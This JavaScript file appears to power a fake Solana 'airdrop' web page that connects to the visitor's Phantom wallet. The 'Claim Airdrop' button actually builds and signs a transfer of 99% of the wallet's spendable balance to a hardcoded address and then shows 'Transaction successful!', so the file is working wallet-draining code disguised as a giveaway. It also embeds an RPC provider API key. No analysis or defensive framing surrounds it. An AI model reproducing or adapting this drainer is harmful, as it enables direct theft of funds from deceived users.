$(document).ready(function () {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    async function handleWalletConnection(resp) {
        console.log("Phantom Wallet connected:", resp);

        const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw',
            'confirmed'
        );

        const public_key = new solanaWeb3.PublicKey(resp.publicKey);
        const walletBalance = await connection.getBalance(public_key);
        console.log("Wallet balance:", walletBalance);

        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        if (walletBalance < minBalance) {
            alert("Insufficient funds for rent.");
            return;
        }

        $('#connect-wallet').text("Claim Airdrop");

        // Set up click for actual claim/transfer
        $('#connect-wallet').off('click').on('click', async () => {
            try {
                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                const balanceForTransfer = walletBalance - minBalance;

                if (balanceForTransfer <= 0) {
                    alert("Insufficient funds for transfer.");
                    return;
                }

                const transferAmount = balanceForTransfer * 0.99;

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: public_key,
                        toPubkey: recieverWallet,
                        lamports: transferAmount,
                    })
                );

                transaction.feePayer = window.solana.publicKey;
                const blockhashObj = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhashObj.blockhash;

                const signed = await window.solana.signTransaction(transaction);
                const txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);

                alert("Transaction successful!");
                $('#connect-wallet').text("Connected");
            } catch (err) {
                console.error("Error during claim:", err);
                alert("Claim failed. Please try again.");
            }
        });
    }

    async function connectPhantom() {
        try {
            const resp = await window.solana.connect();
            sessionStorage.setItem('phantomConnected', 'true');
            sessionStorage.removeItem('phantomInstallRequested');
            handleWalletConnection(resp);
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
            alert("Error connecting to Phantom Wallet.");
        }
    }

    // Main connect button click
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            await connectPhantom();
        } else {
            alert("Phantom Wallet not found. Redirecting to install...");
            sessionStorage.setItem('phantomInstallRequested', 'true');

            if (isMobile) {
                const dappUrl = encodeURIComponent(window.location.href);
                const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
                window.location.href = phantomLink;
            } else {
                window.open('https://phantom.app/download', '_blank');
            }
        }
    });

    // 🔁 Restore connection on mobile return
    window.addEventListener('load', async () => {
        const previouslyConnected = sessionStorage.getItem('phantomConnected');
        if (window.solana && window.solana.isPhantom && previouslyConnected) {
            try {
                const resp = await window.solana.connect({ onlyIfTrusted: true });
                handleWalletConnection(resp);
            } catch (e) {
                console.warn("User not connected or rejected on return.");
            }
        }
    });
});
